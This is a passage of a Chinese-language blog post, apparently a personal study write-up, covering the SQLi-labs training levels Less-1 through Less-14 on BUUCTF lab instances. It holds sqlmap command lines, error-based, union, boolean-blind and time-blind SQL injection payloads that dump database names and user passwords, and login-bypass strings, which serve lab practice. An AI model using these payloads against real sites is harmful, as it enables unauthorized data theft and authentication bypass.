@@ -1,0 +1,3208 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SQLLABS, Violet&#39;s Blog">
+    <meta name="description" content="Summary of knowledge learned">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>SQLLABS | Violet&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Violet&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Violet&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            Summary of knowledge learned
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SQLLABS</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                            <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">Web安全</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                Web安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-09-10
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    11.9k
+                </div>
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="Basic-Challenge"><a href="#Basic-Challenge" class="headerlink" title="Basic Challenge"></a>Basic Challenge</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap:"></a>sqlmap:</h4><p>使用联合查询为例，其他查询只需要修改–technique=U即可</p>
+<p>发现注入点</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -u &#39;http:&#x2F;&#x2F;caeae33c-b104-4be8-861b-9d117ff137e2.node4.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --skip-static --technique&#x3D;U --random-agent --batch -v3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现数据库</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -u &#39;http:&#x2F;&#x2F;caeae33c-b104-4be8-861b-9d117ff137e2.node4.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --skip-static --technique&#x3D;U --random-agent --batch -v3 -dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>结果</p>
+<pre class="line-numbers language-none"><code class="language-none">[*] ctftraining
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] security
+[*] test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>查询数据库security中表</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -u &#39;http:&#x2F;&#x2F;caeae33c-b104-4be8-861b-9d117ff137e2.node4.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --skip-static --technique&#x3D;U --random-agent --batch -v 3 --tables -D security<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>结果</p>
+<pre class="line-numbers language-none"><code class="language-none">+----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>查询user表中的列</p>
+<p>语句</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -u &#39;http:&#x2F;&#x2F;caeae33c-b104-4be8-861b-9d117ff137e2.node4.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --skip-static --technique&#x3D;U --random-agent --batch -v 3 --columns -D security -T users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>获得列内数据</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -u &#39;http:&#x2F;&#x2F;caeae33c-b104-4be8-861b-9d117ff137e2.node4.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; --skip-static --technique&#x3D;U --random-agent --batch -v 3 --columns -D security -T users -C password -dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>发现用户</p>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;1&#39; AND (SELECT 1710 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT (ELT(1710&#x3D;1710,1))),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TBlX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现数据库</p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_schema) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查security中表，如果查看其他库记得修改table_schema in()</p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_name) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES  WHERE table_schema IN (0x7365637572697479)LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查看列</p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x7E,(SELECT MID((IFNULL(CAST((column_name) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name&#x3D;&quot;users&quot; AND table_schema&#x3D;&quot;security&quot; LIMIT 0,1),0x7E,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查看列中内容</p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT MID((IFNULL(CAST((password) AS NCHAR),0x20)),1,54) FROM security.users LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>获得用户名:</p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x7E,(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),0x7E,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现数据库</p>
+<pre class="line-numbers language-none"><code class="language-none">-6497&#39; UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x7E,IFNULL(CAST(schema_name AS NCHAR),0x20),0x7E) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1)-- -
+
+获得其他数据库修改LIMIT a,1 中的a即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>查询数据库security中表</p>
+<pre class="line-numbers language-none"><code class="language-none">-8335&#39; UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x7E,IFNULL(CAST(table_name AS NCHAR),0x20),0x7E) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x7365637572697479) LIMIT 0,1)-- -
+
+获得其他表修改LIMIT a,1 中的a即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>查询user表中的列</p>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;--5520&#39; UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x7E,IFNULL(CAST(column_name AS NCHAR),0x20),0x7E,IFNULL(CAST(column_type AS NCHAR),0x20),0x7E) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name&#x3D;&quot;users&quot; AND table_schema&#x3D;&quot;security&quot; LIMIT 1,1)-- -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>获得数据</p>
+<pre class="line-numbers language-none"><code class="language-none">一次获得全部数据:
+-4235&#39; UNION ALL SELECT NULL,NULL,(SELECT GROUP_CONCAT(IFNULL(CAST(password AS NCHAR),0x20),0x7E,IFNULL(CAST(password AS NCHAR),0x20),0x3c62723e) FROM security.users ORDER BY id)-- -
+
+一次获得一条:
+-4235&#39; UNION ALL SELECT NULL,NULL,(SELECT CONCAT(0x7E,IFNULL(CAST(password AS NCHAR),0x20),0x7E) FROM security.users ORDER BY id LIMIT 5,1)-- -
+
+?id&#x3D;-1&#39; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)-- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+
+?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>数据库第一个字母的 ascii 码为 115，即s</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+
+?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>报错&amp;联合&amp;盲注</td>
+<td>id=$id</td>
+</tr>
+</tbody></table>
+<p>仅仅与Less-1的闭合方式不同</p>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>报错&amp;联合&amp;盲注</td>
+<td>id=(‘$id’)</td>
+</tr>
+</tbody></table>
+<p>仅仅与Less-1的闭合方式不同</p>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>报错&amp;联合&amp;盲注</td>
+<td>id=(“$id”)</td>
+</tr>
+</tbody></table>
+<p>仅仅与Less-1的闭合方式不同</p>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>报错&amp;盲注</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<p>无回显，但是会显示错误，所以可以使用报错与盲注</p>
+<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>报错&amp;盲注</td>
+<td>id=(“$id”)</td>
+</tr>
+</tbody></table>
+<p>仅仅与Less-5的闭合方式不同</p>
+<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>盲注</td>
+<td>id=((‘$id’))</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-源码" data-language="源码"><code class="language-源码"># 使用单引号加双层括号拼接
+$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;
+
+# 支持布尔盲注、延时盲注
+if true:
+    输出 You are in.... Use outfile......
+else:
+    输出 You have an error in your SQL syntax
+  &#x2F;&#x2F;print_r(mysql_error());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因为将print_r(mysql_erro())注释掉了，所以无法使用报错注入。</p>
+<p>看别人的payload可以使用outfile，之前从来没有听过，真的长见识了。之后再仔细研究一下。</p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-17">https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-17</a></p>
+<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>盲注</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<p>与Less-7一样</p>
+<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>时间盲注</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP"># 使用单引号拼接
+$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;
+
+# 支持延时盲注
+if true:
+    输出 You are in............
+else:
+    输出 You are in...........<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因为无论正确与错误输出结果都一样所以只能使用时间盲注。</p>
+<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>时间盲注</td>
+<td>id=”$id”</td>
+</tr>
+</tbody></table>
+<p>除了拼接方式其他都与Less-9相同。</p>
+<h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=”$id”</td>
+</tr>
+</tbody></table>
+<p>除了类型变为了POST，注入位置有所变化，注入语句则完全相同</p>
+<h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><p>可以使用hackbar进行注入。</p>
+<p>因为我电脑的hackbar无法发送Post报文的数据部分，所以这里用postman</p>
+<h4 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h4><pre class="line-numbers language-语句" data-language="语句"><code class="language-语句">sqlmap -u http:&#x2F;&#x2F;11338196-84e7-4162-b1cf-e2819d255a9d.node4.buuoj.cn&#x2F;Less-11&#x2F; -p passwd --skip-static --technique&#x3D;E --random-agent --method&#x3D;post --data&#x3D;&#39;uname&#x3D;1&amp;passwd&#x3D;1&amp;submit&#x3D;Submit&#39; --batch --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><p>这里还可以使用万能密码进行登录</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">
+<span class="token string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-万能密码" data-language="万能密码"><code class="language-万能密码"> 
+# 注释掉 passwd 来登录
+uname&#x3D;admin&#39;--+&amp;passwd&#x3D;&amp;submit&#x3D;Submit
+uname&#x3D;admin&#39;#&amp;passwd&#x3D;&amp;submit&#x3D;Submit
+
+# 注释后面语句 并 添加一个永真条件
+uname&#x3D;admin&amp;passwd&#x3D;1&#39; or 1--+&amp;submit&#x3D;Submit
+uname&#x3D;admin&amp;passwd&#x3D;1&#39;||1--+&amp;submit&#x3D;Submit
+uname&#x3D;admin&amp;passwd&#x3D;1&#39; or 1#&amp;submit&#x3D;Submit
+uname&#x3D;admin&amp;passwd&#x3D;1&#39;||1#&amp;submit&#x3D;Submit
+
+# 闭合后面语句 并 添加一个永真条件
+uname&#x3D;admin&amp;passwd&#x3D;1&#39;or&#39;1&#39;&#x3D;&#39;1&amp;submit&#x3D;Submit
+uname&#x3D;admin&amp;passwd&#x3D;1&#39;||&#39;1&#39;&#x3D;&#39;1&amp;submit&#x3D;Submit
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=($id)</td>
+</tr>
+</tbody></table>
+<p>仅仅闭合方式不同</p>
+<h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=(‘$id’)</td>
+</tr>
+</tbody></table>
+<p>因为没有输出结果，但是有错误结果，所以不能联合查询。</p>
+<h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=”$id”</td>
+</tr>
+</tbody></table>
+<p>仅仅是闭合方式方式不同</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$uname&#x3D;&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;
